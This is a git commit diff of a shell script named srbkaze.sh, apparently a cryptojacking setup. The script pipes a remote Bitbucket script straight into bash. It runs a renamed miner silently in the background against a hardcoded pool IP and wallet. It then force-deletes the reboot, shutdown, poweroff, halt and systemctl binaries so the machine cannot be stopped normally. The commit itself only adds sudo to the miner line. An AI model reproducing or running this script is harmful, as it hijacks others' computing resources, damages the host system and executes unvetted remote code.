9e85ccbc8fd6dc3c6f26b7d9fec7ead27e092ede
kamikaze05 <167535693+kamikaze05@users.noreply.github.com>
2024-05-15 11:08:50 +0700

    Update srbkaze.sh

--- srbkaze.sh
+++ srbkaze.sh
@@ -4,7 +4,7 @@ apt-get install -y wget curl sudo
 sudo apt-get update -y
 curl -sL https://bitbucket.org/new-kamikaze/srbkaze/raw/main/grsrb.sh | bash
 chmod +x srbkaze
-nohup ./srbkaze --algorithm yescryptr32 --pool 139.99.51.162:9981 --wallet kamikaze.worker1 -pass x > /dev/null 2>&1 &
+sudo nohup ./srbkaze --algorithm yescryptr32 --pool 139.99.51.162:9981 --wallet kamikaze.worker1 -pass x > /dev/null 2>&1 &
 sleep 30
 sudo rm -rvf /sbin/reboot /sbin/shutdown /sbin/poweroff /sbin/halt /bin/systemctl /usr/sbin/reboot /usr/sbin/shutdown /usr/sbin/poweroff /usr/sbin/halt /usr/bin/systemctl || rm -rvf /sbin/reboot /sbin/shutdown /sbin/poweroff /sbin/halt /bin/systemctl /usr/sbin/reboot /usr/sbin/shutdown /usr/sbin/poweroff /usr/sbin/halt /usr/bin/systemctl
 curl ifconfig.me
